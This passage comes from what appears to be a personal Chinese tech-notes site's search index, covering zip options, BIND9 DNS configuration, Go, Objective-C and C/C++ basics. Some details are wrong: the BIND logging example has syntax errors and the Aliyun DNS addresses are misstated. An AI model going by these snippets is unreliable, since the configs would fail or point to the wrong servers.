不显示指令执行过程。\n-r 递归处理，将指定目录下的所有文件和子目录一并处理。\n-S 包含系统和隐藏文件。\n-t<日期时间> 把压缩文件的日期设成指定的日期。\n-T 检查备份文件内的每个文件是否正确无误。\n-u 与 -f 参数类似，但是除了更新现有的文件外，也会将压缩文件中的其他文件解压缩到目录中。\n-v 显示指令执行过程或显示版本信息。\n-V 保存VMS操作系统的文件属性。\n-w 在文件名称里假如版本编号，本参数仅在VMS操作系统下有效。\n-x<范本样式> 压缩时排除符合条件的文件。\n-X 不保存额外的文件属性。\n-y 直接保存符号连接，而非该连接所指向的文件，本参数仅在UNIX之类的系统下有效。\n-z 替压缩文件加上注释。\n-$ 保存第一个被压缩文件所在磁盘的卷册名称。\n-<压缩效率> 压缩效率是一个介于1-9的数值。 实例 将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip: zip -q -r html.zip /home/html 注, 如果在我们在 /home/html 目录下，可以执行以下命令: zip -q -r html.zip * 来实现一样效果. 从压缩文件 cp.zip 中删除文件 a.c: zip -dv cp.zip a.c","tags":"操作系统","url":"/yq-docs-operating-system-linux-Linux-instruction-zip.html","loc":"/yq-docs-operating-system-linux-Linux-instruction-zip.html"},{"title":"一些常见发行版下载","text":"Ubuntu 官网: https://cn.ubuntu.com/download/desktop Ubuntu14: https://releases.ubuntu.com/trusty/ Ubuntu22: https://releases.ubuntu.com/22.04/ubuntu-22.04.3-desktop-amd64.iso 注解 发行版的 LTS 表示长期支持(一般都是五年吧)","tags":"操作系统","url":"/yq-docs-operating-system-linux-Some-common-release-versions-download.html","loc":"/yq-docs-operating-system-linux-Some-common-release-versions-download.html"},{"title":"一些安全相关文件","text":"# todo: /etc/login.defs umask 命令, 创建文件权限减去umask设置的值 /etc/login.defs 定义与 /etc/passwd , /etc/shadow 配套的用户限制设置 /etc/knockd.conf ssh相关敲门 使用 nmap -p 端口号 IP地址 按照文件所给的端口依次敲门可以恢复访问","tags":"操作系统","url":"/yq-docs-operating-system-linux-Some-security--related-documents.html","loc":"/yq-docs-operating-system-linux-Some-security--related-documents.html"},{"title":"xclip","text":"linux下剪切板与终端的交互.","tags":"操作系统","url":"/yq-docs-operating-system-linux-package-XClip.html","loc":"/yq-docs-operating-system-linux-package-XClip.html"},{"title":"bind9","text":"参考:: ISC BIND9 - 最详细、最认真的从零开始的 BIND 9 - DNS服务搭建及其原理讲解 前置 DNS DNS ( Domain Name Service) : 域名解析服务, 将字符串域名解析为数字IP DNS ZONE DNS域，被用来划分DNS主域。 传统的DNS域类似一个树状的结构，被分成不同的区域，这些区域可区分一个DNS服务器中命名空间中不同的区域。 DNS区域是构成DNS命名空间的一部分，由特定组织或管理员加以管理，其可以对权威性域名服务器等DNS组件更加精细的控制。 域名空间是一个分层数，其中DNS的根域位于顶部，DNS区域始于该树中的一个域，并且可以扩展到下边的子域。 资源记录类型 资源记录类型 字符串 含义 A Address地址， IPv4 AAAA Address地址 IPv6 NS Name Server域名服务器 SOA Start of Authority 起始授权机构 MX Mail Exchanger 邮件交换 CNAME Canonical Name规范名. CNAME-records ( Canonical name for an alias )是域名的别名。 PTR Pointer 指针，即反向DNS系统，用于查询IP地址时给出相关的域名，即查询IP地址的PTR记录给出该IP指向的域名，在 Zone 文件中被设置； TXT Text，网络名称系统的记录，可讲文字信息提供给网络意外的来源，其中有一个非常重要的功能就是当外部查询需要显示BIND的相关版本号时，可以指定 TXT查询，这个配置是默认的；谷歌会使用 TXT 记录来验证网站的拥有权以及确保电子邮件的安全； SRV Service 记录，域名中用于指定服务器并提供服务的位置：主机、端口号；一般在 Zone File 中被定义； FQDN FQDN(Fully Qualified Domain Name) 完全合格域名/全程域名，即域名可以通过DNS进行解析，其公式 FQDN = HostName + Domain。 解决多服务问题, 比如域名为 yanquer.con , ftp 用 ftp.yanquer.com , ssh 用 ssh.yanquer.com 介绍 bind9 是目前市面是最主流的开源DNS软件 安装: apt install bind9 配置文件位置: /etc/bind/named.conf 查看其内容: root@6c378cbe42dd:/# cat /etc/bind\nbind/                   bindresvport.blacklist\nroot@6c378cbe42dd:/# cat /etc/bind/named.conf\n// This is the primary configuration file for the BIND DNS server named.\n//\n// Please read /usr/share/doc/bind9/README.Debian.gz for information on the\n// structure of BIND configuration files in Debian, *BEFORE* you customize\n// this configuration file.\n//\n// If you are just adding zones, please do that in /etc/bind/named.conf.local\n\ninclude \"/etc/bind/named.conf.options\";\ninclude \"/etc/bind/named.conf.local\";\ninclude \"/etc/bind/named.conf.default-zones\"; 可以看到其引用了三个文件: /etc/bind/named.conf.options : named.conf.options /etc/bind/named.conf.local : named.conf.local /etc/bind/named.conf.default-zones : named.conf.default-zones 配置文件说明 以下文件都在 /etc/bind/ 目录下 注意不要更改文件权限 named.conf.options option 配置 named.conf.local Zone 的引导配置文件 定义了 BIND9 中的 ZONE（区域）文件在named.conf.local文件中的定义，用于定义存储解析的域名的数据库文件，即域名与IP地址的映射关系以及DNS发送的解析域名数据包的相关参数设置，其定义的格式如下: zone \"<YOUR DNS Domain Name >\" {\n    <Configurations>\n} 也可以定义反向解析域名通过以下的格式进行定义: zone \"<YOUR IP ADDRESS>-addr.arpa\" {\n    <Configurations>\n} Configurations 常用参数配置如下: file: 用于指出域名与IP地址解析的数据库配置文件； allow-transfer: 这个地方的配置是用来给出 Failover 或者是 递归查询DNS服务器的IP地址，如果之前在 options 里配置的allow-transfer 如果设置成了参数 yes， 那么需要在这里指出递归查询服务器的IP地址； type: 用于指定当前DNS解析服务器的位置，是主服务器 master 还是从服务器 slaver named.conf.default-zones 机器默认域名配置: # vim /etc/default/bind9\nOPTIONS=\"-u bind -4\" Zone File 保存 RR (Record Resource) 信息的文件 DNS Record Types 分为很多种 地址解析 ( Address Records) 别名记录（Alias Records） 邮件交换记录（Email Exchange Records） 域名服务器记录（Name Server Records）； 确定你的需求，再编写你的Zone File； 配置含义说明 在 zone file 中，注释的符号是： ; (分号) @ ( at - sign ) 是代表当前的区域，即 每一个 域名就是一个区域(region)，\n一般在 $ORIGIN [REGION NAME] 设定了当前作用的区域，作用区域是代表当前的解析域名区域； 例: ;\n; BIND data file for local loopback interface\n;\n; Import ZSK / KSK\n;\n;\n$ORIGIN domain.com.\n; 我们已经定义了一个区域，那么在定义 SOA 的时候可以进行两种定义方式\n@ IN SOA ns.domain.com. admin.domain.com. (\n                3        ; Serial\n            604800       ; Refresh\n            86400        ; Retry\n            2419200      ; Expire\n            604800 )     ; Negative Cache TTL\n; 或者我们不需要 at-sign - @ 符号，直接引用ORIGIN的名字\n；在这里这两条配置代表的含义是一样的\ndomain.com. ns.domain.com. admin.domain.com. (\n                3        ; Serial\n            604800       ; Refresh\n            86400        ; Retry\n            2419200      ; Expire\n            604800 )     ; Negative Cache TTL 上边的配置中 @ 代表了当前的区域 domain.com. domain.com. 就是当前的区域 Zone File - TTL TTL 规定了Resource Record 的失效时间，即当前资源记录能够被缓存的时间长短，默认的单位为秒，能够设定的最大时间长度是 32 bit 的整形变量 ( 0 到 4294967295 )，单位是秒；RR都会被保存在DNS的解析服务器的cache上，有一个失效的时间，TTL就是控制这个失效时间的一个参数； 这个参数可以单独进行设定，也可以在 SOA 设定中进行配置： 单独设定： $TTL [TIME] 在 SOA 中进行设定： SOA - Negative Cache TTL 例: $TTL 6048000 Zone File - SOA SOA - Start of Authority， 起始授权部分，是每一个 Zone File 必须包含的部分，也是包含域名的关键信息。 如果有多台DNS来管理同一个域名，就需要在 zone file 中规定如何规定两个域名解析服务器了 - Name Server；\n即需要在定义 Zone Fie 的时候，需要特别明确 SOA 的定义，SOA 定义了域名解析服务器的对于区域 (Location) 的数据信息来源，即规定了解析区域的IP相关地址； 每一个域名区域都需要一个 SOA 记录； 定义的方式是: [LOCATION NAME] IN SOA [PRIMARY_DNS_SERVER_NAME] [EMAIL_ADDRESS_NAME] (\n        1           ; Serial\n        3h          ; Refresh after 3 hours\n        1h          ; Retry after 1 hour\n        1w          ; Expire After 1 Week\n        1h          ; Negative caching TTL of 1 day\n) 配置举例: domain.com. ns.domain.com. admin.domain.com. (\n                3        ; Serial\n            604800       ; Refresh\n            86400        ; Retry\n            2419200      ; Expire\n            604800 )     ; Negative Cache TTL 解释一下上边的相关参数： Location Name 从前边 $ORIGIN 我们已经知道是一个区域的名称，或者用 @ 进行代替； PRIMARY_DNS_SERVER_NAME 用于规定解析当前域名的主服务器，这个服务器的IP地址以及详细资源需要在后边被规定； EMAIL_ADDRESS_NAME 指定了管理员的 Email 地址，以上边为例： admin.domain.com. == admin@domain.com. Serial 序号，代表着当前数据库文件的新旧， 该值越大表示当前数据库的配置越新，一般来说这个值设定的值遵循 YYYYMMMMDDDD 的格式； 这个数值必须小于 4294967296；在这里涉及到一个 从服务器 ( Slave )的 配置问题，如果你需要 从服务器 何时从主服务器拉取最新的配置，就需要保持从服务器这个数值低于主服务器的数值； Refresh 更新的频率，设置 Slave DNS 服务器 去向 主服务器 进行配置更新的周期； Retry 失败重新尝尝试时间，如果 Slave 服务器无法对 Master 进行链接，则需要设置这个值规定多长时间进行一次重试连接； Expire 是失效时间，如果一直失败连接，那么这个配置规定了重试连接的最大时间； Negative Cache TTL 缓存时间，在整个 zone file 都没有规定 TTL 时间的情况下，那么就以 SOA 中规定的 TTL 为主； 对于各个参数的限制: Refresh >= Retry × 2\nRefresh + Retry < Expire\nExpire >= Retry × 10\nExpire >= 7 Days 注解 在所有的配置中， ns.domain.com != ns.domain.com. ，必须注意在 zone file 中的配置文件的最后 . 必须不能省略； 如果不写最后一个的 . 那么该域名就是一个 相对名 ，结果就是在解析的过程中，这条资源就被当成 ns.domain.com.domain.com zone file - Name Server Records Name Server Records 定义了在当前 DNS服务器 中的 NS 的 IP地址，在每一个 zone file 中必须指定 主/从 域名解析器的IP地址， 使用 A 记录，这个IP地址必须与你搭建的DNS服务器保持一致； 举例: ; 记录 NS 记录\n@                IN            NS            ns.domain.com.\n; 记录 NS 记录对应的 IP 地址信息\nns.domain.com.   IN            A            192.168.1.1 zone file - Address Records Address Records 记录了 域名 与 IP 地址的对应关系: ns.domain.com.                IN            A            192.168.1.1 zone file - Canonical Name Records CName 将 单个昵称或者别名映射到一个可能存在在区域外的真实的区域.\n在一个域名下存在多个子域名，如果需要更改映射之前的子域名，那么只需要更改映射的域名地址就可以了: ;\n$TTL 2d\n$ORIGIN domain.com.\n...\nserver1        IN        A        192.168.1.1\nwww            IN        CNAME    Server1 配置项说明 acl 一般来说，ACL模块用来承担控制主机可以访问域名解析服务器的角色，其设置不会让控制文件的配置非常冗余和庞大。\n采用这个配置可以有效防范DOS以及Spoofing攻击。\n一般来说定义这部分的内容来规定IP是否能够被接入以及Blacklist来阻止某些特定的IP地址介入到域名解析服务器中。 ACL匹配客户端是否能够接入到域名服务器基于三个基本的特征: 客户端的IPv4或者IPv6地址 用于签署请求的 TSIG 和 SIG(0) 密钥 在DNS客户端子网选项中编码的前缀地址 匹配 acl 定义以及使用规则如下： string 是用来命名IP地址集的一个变量名，可以随意地被命名: acl <string> { <address_match_element>; ... }; 举一个在 named.conf.options 文件中被定义的例子: acl bogusnets {\n    0.0.0.0/8;  192.0.2.0/24; 224.0.0.0/3;\n    10.0.0.0/8; 172.16.0.0/12; 192.168.0.0/16;\n}; // 这个部分\n// Set up an ACL called our-nets. Replace this with the\n// real IP numbers.\nacl our-nets { 172.16.2.11/24; 172.16.2.12/24; }; //子网的名称 logging logging 部分的配置为DNS解析服务器提供了日志记录的功能，DNS服务器上的所有日志记录被存储到了指定的文件中。 其通用的配置文件为: logging {\n    category <string> { <channel_name_string>; ... };\n    channel <string> {\n            buffered <boolean>;\n            file <quoted_string> [ versions ( unlimited | <integer> ) ]\n                [ size <size> ] [ suffix ( increment | timestamp ) ];\n            null;\n            print-category <boolean>;\n            print-severity <boolean>;\n            print-time ( iso8601 | iso8601-utc | local | <boolean> );\n            severity <log_severity>;\n            stderr;\n            syslog [ <syslog_facility> ];\n    };\n}; 从上边的通用配置格式可以看出来，logging 模块分为两个部分，category 和 channel. channel的作用是指定输出的方式、日志格式的选项和事件的严重性，每一个channel 可以指定一个 category 来指定记录的事件类型。 category 用来区分不同的事件产生的类别或者场景，比如：客户端请求-client request、配置文件解析处理-Configuration file parsing and processing。 如果在 named.conf.options 文件中没有指定 logging 模块系统会给出一个默认的配置: logging {\n    category default { default_syslog; default_debug; };\n    category unmatched { null; };\n}; channel 的配置规则 所有的日志输出都需要 channel 来指定输出格式，BIND9 对于创建 channel 的数量没有限制。 每一个 channel 都需要为该通道的日志信息指定一个 destination clause - 目的句柄，目的句柄在 channel 阶段被配置，这个目的句柄用来区分： 输出到具体的文件的名字 - file 输出到具体的系统日志工具中（syslog/syslogd）- syslog 输出到终端显示- 标准错误流(standard error stream) 或者该错误消息直接被丢弃 - null。 其次，channel 的配置可以规定每一个错误日志消息的响应级别，默认的响应级别是info ，channel 可以规定接受错误消息的级别；\n此外，channel 还可以控制输出错误日志消息的格式，可以包含：响应时间戳、category名字、严重等级等。 channel 的配置参数 buffered: 用来规定是否刷新错误日志的文件，其参数值为<boolean>，在 BIND9 中 <boolean> 值的参数值为 yes / no，如果设置成为 yes 那么日志消息流(一般每一个错误日志消息都是一个 Log Entry)就不会刷新，而是被保存在缓冲区中了，不会刷新到文件中。 file： 类似于Linux的通道概念，file 将日志输出流通过通道直接输出给文件，从上边的通用配置可以看出来可以为 file 指定文本文件的大小 - size ；指定 log 文件的版本号 - version；指定用于命名备份版本的格式 - suffix size 用来限制log文件的大小，如果log文件的大小设置超过了设定的阈值，那么系统会自动停止输出内容到文件中； versions： 用于指定新创建的 log文件数存储到本地的上限值，默认的参数值为unlimited，当指定的文件的大小超过设定的size值得时候，如果没有指定 versions，那么系统就不会继续写进log；如果制定了versions，那么就会继续写入； suffix ：设定用来命名log文件的方式；好像没啥用，我添加这个参数没有什么反应...； syslog：将通道定向到系统的日志文件流中； 常用的支持日志文件服务为：dameon、syslog、local6、local7； severity：用来承担定义日志严重级别的定义角色，相当于 syslog - priorities。比如说定义了日志的严重级别为 Debug，那么会输出日志事件 Debug 以上的错误到文件中。一般常用的严重等级： debug[level]、notice、warning、dynamic - 与当前服务器的日志保持一致；一般的 DNS服务器的日志等级调成 info即可； stderr：将通道指向服务器的标准错误流。这是为了在服务器作为前台进程运行时使用； print-time： yes / no / local / iso8601 / iso8061-utc 可以设定不同的输出到日志文件的时间格式； print-category：打印日志消息配置category 的信息到你设定的日志文件中； print-severity： 打印日志的严重等级 category词组配置规则 category词组配置规则: category <config_string> { <channel_name_string>; ... }; client： 客户端请求； cname：由于是CNAME而不是a /AAAA记录 的域名服务器； config： 配置文件解析和处理过程； database：与名称服务器内部用于存储区域和缓存数据的数据库相关的消息； general： 没有被归类的 category 类别的其他种类的日志文件信息； lame-servers： 远程服务器中的错误配置，BIND 9在解析期间试图查询这些服务器时发现； network： 网络操作； notify： 通知协议； queries：记录所有查询 DNS服务器的 query； query-errors： 关于导致某些失败的查询的信息； xfer-in：区域传输服务器正在接收； xfer-out：区域传输服务器正在发送的信息； zoneload：加载区域和创建自动空区域； 怎么配置这个服务 配置的 logging 服务会创建指定的日志文件，该日志文件从服务挂起的时候被创建，用于记录DNS服务中的相关的配置信息以及交换信息。 在 Debian9 的默认存储目录为 /var/cache/bind/*. 也可以为其指定你想要存储的位置.\n我个人喜欢将 BIND 日志和系统日志保存在一起，即保存路径为：/var/log/bind。\n这个路径不是在你安装 BIND 时候就已经创建了，需要你自己创建对应的文件目录； 如果你想要配置成一个自己的目录，首先你需要创建一个自定义的目录，比如说我指定了我想要存放日志的文件的目录： /var/log/bind，如果不为这个文件使用chown命令指定权限的话会出现 isc_stdio_open '/var/log/example.log' failed 的报错： 首先你必须手动创建自己的文件到指定目录下；\n解决方法是: sudo chown bind:root /var/log/bind/* ； 现在我们已经基本上了解了 logging 的工作原理.\n其工作机制简单地来说就是，首先你需要创建一个 channel 来规定输出日志流的格式还以及日志文件名、文件版本.\n每一个 channel 可以被多个 category 调用使用，\n每一个 category 相当于一个 BIND9 内嵌的服务模块，\n服务模块去调用日志配置模最后输出格式化日志。 在这里我之前并没有给出对应的配置示例，现在给出示例: // named.conf.options 文件中给出logging的配置示例\nlogging {\n    // 在我自己使用BIND进行DNS解析的时候，出现了 TIME_OUT 的相关错误，这个错误是需要在 client 进行日志记录\n    // 因此对于客户端的解析需要有相关的日志配置，才能发现在解析时的问题\n    //\n    //\n    //\n        category client { default_client; } // 指定 client 所有的错误\n        channel default_client {\n            file \"/var/log/bind/err/client.log\" version 1 size 20m\n            print-category yes;\n            print-time iso8061;\n            severity debug 3;\n        }\n} options options 的参数设置会影响整个 BIND9 DNS环境的配置，具体各部分常用到的配置参数如下 listen-on： 用于配置监听的端口以及IPv4地址，默认的监听端口为：53； listen-on-v6：用于监听 IPv6 地址以及端口； directory: 用于指定读取DNS数据文件的文件夹，默认的文件夹的路径为：/var/cache/bind； dump-file：选项用来设置域名缓存数据库文件的位置，可以自己定义。默认的存储文件为：named_dump.db； statistics-file：选项用来设置状态统计文件的位置，可以自己定义。； memstatistics-file ：选项用来设置服务器输出的内存使用统计信息。默认保存在 /var/named/data 目录下，文件名为 named.memstats； allow-query：选项用来设置允许DNS查询的客户端地址，默认值为localhost, 可以设置为某个网段、任意地址、具体的某台主机三种情况。例如，要修改为任意地址，就在括号内的加入 any，也可以引用之前创建的 acl 内的所有地址； recursion：用于设置递归查询，一般客户机和服务器之间属于递归查询，即当客户机向DNS服务器发出查询请求后，若DNS服务器本身不能解析，则会向另外的DNS服务器发出查询请求，得到结果后转交给客户机。此选项有yes和no两个值。这个选项用于设置 Failover 非常有用； dnssec-enable： 选项用来设置是否启用DNSSEC支持，DNSSEC可以用来验证DNS数据的有效性，该选项有yes和no两个值，默认值为yes。 dnssec-validation：选项用来设置是否启用DNSSEC确认，默认值为yes，可以选择 auto。 bindkeys-file ： 用来设置内置信任的密钥文件，其默认值为 /etc/named/iscdlv.key； managed-keys-directory： 选项用于指定目录中的文件存储位置，跟踪管理 DNSSEC 密钥， 这部分的内容在后边会有介绍； forwarders：DNS转发器。用于设定该DNS解析服务器无法进行当前域名解析的情况下，进行转发解析的DNS地址，其中 8.8.8.8 和 8.8.4.4 是谷歌的免费DNS服务器的网络地址；233.5.5.5 和 233.6.6.6 是阿里云的免费DNS地址。当设置了 forwarder 的转发器之后，所有的非本域的和在缓存中无法查找到的域名查询都转发都设置的DNS转发器，由DNS转发器 完成转发操作。因此这台转发器的缓存中就记录了丰富的域名信息。因此如果遇到非本域的查询，转发器的缓存就可以做到查询，从而减少了向外部的查询流量。 forward: 选择默认的IP地址即可； rrset-order：\n在 BIND 9 提供的负载均衡策略建立在一个名称（域名 - Name）使用多个资源记录 ( Records ) 的情况下，其实现的轮询机制并不是传统的负载均衡服务器实现的轮询机制 - 即追踪和记录每一次应答的资源顺序；\nBIND 9 实现了一个类似 List 的数据结构，将所有的资源记录填入到 一个顺序表中，这个填入的次序随机，或者根据设定的参数随机； 格式: [class class_name] [type type_name] [name \"domain_name\"] order ordering 如果参数没有被赋值，那么默认的赋值为: class: ANY type: ANY Name: * 参数: fixed ： 根据 zone 文件定义资源记录的顺序按照顺序逐个进行解析； random： 根据 zone 文件资源记录随机返回解析记录； cyclic： 创建一个循环，循环输出资源记录； none： 完全随机的资源返回形式； controls controls语句声明了系统管理员用于管理名称服务器远程操作的控制通道。\nrndc使用这些控制通道向名称服务器发送命令，并从名称服务器检索非dns结果。","tags":"操作系统","url":"/yq-docs-operating-system-linux-package-bind9-software-package.html","loc":"/yq-docs-operating-system-linux-package-bind9-software-package.html"},{"title":"gitg","text":"一个图形化git工具, 支持便捷的查看git提交等. 安装: apt install gitg 执行, 直接输入命令即可打开图形界面: gitg","tags":"操作系统","url":"/yq-docs-operating-system-linux-package-gitg.html","loc":"/yq-docs-operating-system-linux-package-gitg.html"},{"title":"Go","text":"Go学习记录, 24.01.29 第一版源于 Go 语言教程 特色 简洁、快速、安全 并行、有趣、开源 内存管理、数组安全、编译迅速 用途 Go 语言被设计成一门应用于搭载 Web 服务器，存储集群或类似用途的巨型中央服务器的系统编程语言。\n对于高性能分布式系统领域而言，Go 语言无疑比大多数其它语言有着更高的开发效率。\n它提供了海量并行的支持，这对于游戏服务端的开发而言是再好不过了。 Mac下安装: brew install go","tags":"后端","url":"/yq-docs-rear-end-GO-index.html","loc":"/yq-docs-rear-end-GO-index.html"},{"title":"Object-C","text":"Mac上比较旧的开发语言 一些关键字 nonatomic nonatomic 是一个线程安全相关的属性修饰符。\n它用于指定属性的访问方法（getter 和 setter）在多线程环境下不需要进行加锁操作。\n使用 nonatomic 修饰的属性访问会更快，但在并发访问时可能会出现数据竞争和不一致的问题。 如果转换为Swift, Swift 中的属性默认是非原子的，因此不需要显式指定 nonatomic。\n如果你需要在多线程环境中访问属性，并确保线程安全，可以使用其他手段来保证，例如使用串行队列或锁。 retain retain 是指定属性的内存管理语义的修饰符。\n在引用计数内存管理模型中，它用于增加被引用对象的引用计数，并在不再需要时释放引用计数。\nretain 表示属性是一个 强引用 ，它会在设置新值时自动增加引用计数，并在不再需要时适时释放引用计数。 如果转换为Swift, 在 Swift 中，默认使用强引用来管理内存，因此不需要显式指定 retain。\n属性的引用计数会在不再被引用时自动减少，并在合适的时机释放内存。 weak weak 是一种属性修饰符，在 Swift 中用于创建 弱引用（weak reference） .\n它主要用于解决循环引用（retain cycle）的问题，并帮助管理内存。 以下是 weak 修饰符的作用和特点： 弱引用：使用 weak 修饰的属性创建的引用是弱引用。\n弱引用不会增加对象的引用计数，当所引用的对象被释放时，弱引用会自动设置为 nil。\n这有助于避免循环引用，从而防止内存泄漏。 解决循环引用：循环引用指的是两个或多个对象之间形成的相互强引用关系，导致它们无法被正确释放。\n这可能会导致内存泄漏，因为对象无法被垃圾回收。\n通过在其中一个对象的属性上使用 weak 修饰符，可以打破循环引用，使其中一个对象成为弱引用。 自动设置为 nil：当所引用的对象被释放时，弱引用会自动设置为 nil。\n这意味着你可以安全地使用弱引用，而不必担心访问已释放的对象。 需要注意的是，只有在引用对象的生命周期可能比引用它的对象短时，才适合使用弱引用。\n如果引用对象的生命周期与引用它的对象相同或更长，那么使用弱引用可能会导致访问已释放对象的错误。","tags":"后端","url":"/yq-docs-rear-end-Object-C-index.html","loc":"/yq-docs-rear-end-Object-C-index.html"},{"title":"基础知识C(++)","text":"结构体 定义 定义: struct $tag {\n        $c_type arg1;\n        $c_type arg2;\n        ...\n} arg_list; struct 是关键字表示定义结构体 tag 是结构题标签, 相当于Python的类 c_type arg1 表示定义结构题内具体的成员变量, 比如 int x arg_list 是当前结构体变量名, 可以为多个. 可以理解为 tag 标签实例化了多个类 注解 结构体标签, 成员变量定义, 结构题变量名. 定义时, 至少需要其中两个, 否则错误. 如, 以下声明了拥有3个成员的结构体，分别为整型的a，字符型的b和双精度的c: //结构体的标签被命名为SIMPLE,没有声明变量\nstruct SIMPLE\n{\n        int a;\n        char b;\n        double c;\n};\n//用SIMPLE标签的结构体，另外声明了变量t1、t2、t3\nstruct SIMPLE t1, t2[20], *t3; 等价与: struct SIMPLE\n{\n        int a;\n        char b;\n        double c;\n} t1, t2[20], *t3; 初始化 初始化: #include <stdio.h>\n\nstruct Books\n{\n        char  title[50];\n        char  author[50];\n        char  subject[100];\n        int   book_id;\n} book = {\"标题\", \"作者\", \"C\", 1111};\n\n// 访问使用 . , 如 book.book_id 访问 结构体本身用 . 访问\n结构题指针用 -> 访问 用例: typedef 重新定义已有变量、类型等 char数组赋值 初始化直接赋值: char a[20] = \"hello\"; 数组逐个赋值: char a[20] = {'h', 'e', 'l', 'l', 'o'}; strcpy拷贝赋值: char a[20];\nstrcpy(a, \"hello\") 其他: char const *se = \"hello\"; 等价与: char const *see;\nsee = \"hello\"; 注解 char const *se = \"hello\"; 需要加 const 是因为char表示字符常量, 不允许被修改. 单/双引号 单引号引用单个字符, 表示字符字面量, 占用一个字符, 代表整数, 整数值对应于该字符在编译器采用的字符集中的序列值(一般编译器采用的都是ASCII字符集) 双引号引用字符串常量, 表示字符串字面量, 占用为所有字符个数加一, 因为每个字符串末尾自动会加上一个空字符 '0', 代表字符指针, 指向字符数组首地址. 如 \"a\"+1 表示指针运算, 指向结束符 '0'. 空字符常量 '0' 空白字符串 \"\" 指针 指针也是一种变量，只不过它的内存单元中保存的是一个标识其他位置的地址。。由于地址也是整数，在３２位平台下，指针默认为３２位。。 指向的直接意思就是指针变量所保存的其他的地址单元中所存放的数据类型: int *p ;        //p 变量保存的地址所在内存单元中的数据类型为整型\n\nfloat *q;       // ... 浮点型 不论指向的数据类型为那种，指针变量其本身永远为整型，因为它保存的地址。 C语言中定义一个变量时可以初始化: char str[10] = {\"hello world\"}; 当编译器遇到这句时，会把str数组中从第一个元素把hello world0 逐个填入。。 C语言中规定数组代表数组所在内存位置的首地址，也是 str[0]的地址，即: str = &str[0]; 而printf(\"%s\",str); 为什么用首地址就可以输出字符串, 因为这里给的也是地址. 即打印出的结果为变量地址所指向的值. 比较打脑壳的情况: char *s ;\ns = \"China\";\n\n// 可以编译通过, 因为这里赋值实际还是赋值的首地址\n// \"China\" 是一个字符串, 若用变量表示指向即为其首地址, 这里把首地址赋值给s (打印出来也是首地址而非\"China\") 几个不同概念 char *a : 保存字符串首地址的指针变量 char a[] : 字符数组 char *a [] : []的优先级高于*, 所以a先和 []结合, 他还是一个数组, 数组中的元素才是char * char **a  : 二级指针, 表示一级指针 的地址 注解 char* a 等价与 char *a, 都是表示指针 不过如果一起定义两个指针只能这样写: char *a, *b 特殊符号 # 在C(++)中, #表示预处理或者预编译(正式编译前的处理, 非编译). 注解 C语言程序从编写到运行要经过预处理、编译、汇编和链接这 4 个阶段 #define(宏定义) 定义普通常量 定义一个标识符来表示一个常量。其特点是：定义的标识符不占内存，只是一个临时的符号，预编译后这个符号就不存在了。 用 #define 定义标识符的一般形式为: #define  标识符  常量   //注意, 最后没有分号 作用范围为当前源文件, 若要终止使用宏定义, 用: #undef  标识符 表示不再使用宏替换 注解 宏定义的标识符一般大写, 末尾不加分号, 且支持定义嵌套 带参数替换 例: #define S(a,b) a*b\n\narea=S(3,2); 第一步被换为area=a*b; 第二步换为area=3*2; 注解 注意宏替换只做替换, 不求解. 宏展开不占用运行时间，只占用编译时间，函数调用占运行时间（分配内存、保留现场、值传递、返回值） 双#表示连接 ##是连接符号 例: #define Conn(x,y) x##y 表示x与y连接, 如: int n = Conn(123,456); 结果就是n=123456; 表示转换字符#@ \"#@\"表示转换字符(结果加上单引号), 结果返回constchar类型 例: #define ToChar(x) #@x 如: char a = ToChar(1); 结果就是a='1'; 做个越界试验: char a = ToChar(123); 结果是a='3'; 但是如果你的参数超过四个字符，编译器就给给你报错了！error C2015:too many characters in constant ：P 转换字符串单# #是替换为字符串 例: #define ToString(x) #x 若定义: char* str = ToString(123132); 就成了str=\"123132\"; 注解 可以使用 ifndef 来避免重复定义宏: #ifndef __headerfileXXX__\n#define __headerfileXXX__\n…\ncode\n…\n#endif c++虚函数 被virtual关键字修饰的成员函数，就是虚函数. 作用是为了实现多态(将接口与实现分离) 借用百度百科的例子: #include<iostream>\nusing namespace std;\n\nclass A\n{\n        public:\n                virtual void print(){cout<<\"This is A\"<<endl;}\n};\nclass B : public A\n{\n        public:\n        void print(){cout<<\"This is B\"<<endl;}\n};\n\nint main1()\n{\n        A a;\n        B b;\n        a.print();\n        b.print();\n        return 0;\n}\n\nint main2()\n{\n        A a;\n        B b;\n        A *p1 = &a;\n        A *p2 = &b;\n        p1->print();\n        p2->print();\n        return 0;\n} 此例中, 如果父类print不是定义的虚函数, 那么main2函数打印结果都是 This is A. 只要基类是虚函数, 那么派生类继承此虚函数的, 不管是否有关键字virtual, 都是虚函数. 因为如果没有写关键字, 编译器会自动帮你加上. 参考:: https://baike.baidu.com/item /虚函数#:~:text=在某基类中声明为%20virtual%20并在一个或多个派生类中被重新定义的成员函数，用法格式为：virtual,函数返回类型%20函数名（参数表）%20%7B函数体%7D；实现多态性，通过指向派生类的基类指针或引用，访问派生类中同名覆盖成员函数%E3%80%82 另外一个问题, 虚函数的继承要保持一致, 如, 以下两个定义是不等价的: virtual void func()const\n\nvirtual void func() 虚函数的声明与定义要求非常严格，只有在子函数中的虚函数与父函数一模一样的时候（包括限定符）才会被认为是真正的虚函数，不然的话就只能是重载。这被称为虚函数定义的同名覆盖原则，意思是只有名称完全一样时才能完成虚函数的定义。 内存分区 内存分5个区：全局名字空间，自由存储区，寄存器，代码空间，栈 大端/小端 大端: 较低的有效字节存放在较高的存储器地址中，较高的有效字节存放在较低的存储器地址 小端: 较高的有效字节存放在较高的存储器地址中，较低的有效字节存放在较低的存储器地址 栈的地址分配是从高->低,堆的地址分配是从低->高.","tags":"后端","url":"/yq-docs-rear-end-from-Basic-knowledge.html","loc":"/yq-docs-rear-end-from-Basic-knowledge.html"},{"title":"C++","text":"最初本来是在 基础知识 等里面混着C与C++说, 后面是越来越多了, 觉得还是分了好点. 数组形参与实参的说明 在C++中,如果形参类型是`char a[]`(或其他数组类型),它会默认 decay(退化) 成 char*(或相应的指针类型)。\n所以 char a[] 形参会被视为 char* a. 举一个例子: void print(char a[]) {\n    cout << a << endl;\n}\n\nint main() {\n    char str[] = \"Hello\";\n    print(str);\n} 这里, print 函数的形参是 char a[] , 但是在调用 print(str) 时,\nstr 数组会自动退化为指针.\n所以实际上 a 是 char* 类型,并且指向字符串 \"Hello\" . 函数形参定义是否应该使用指针 主要取决于我们是否需要修改原变量的值吧 当需要修改原变量值时, 必须传递指针, 比如结构体; 不需要修改值时, 都可以, 不过使用指针是对原来变量的引用可以节省空间. 否则就是变量的复制. char *str[]与char str[]区别 char *str[] 